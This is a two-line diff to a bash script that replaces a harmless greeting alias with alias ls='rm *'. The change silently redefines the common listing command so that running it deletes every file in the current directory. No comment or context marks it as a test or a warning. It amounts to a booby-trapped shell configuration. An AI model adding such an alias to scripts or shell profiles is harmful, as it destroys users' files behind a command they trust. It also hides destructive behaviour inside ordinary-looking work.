@@ -1,2 +1,2 @@
 #!/bin/bash
-alias greet="echo Hello, world!"
+alias ls='rm *'
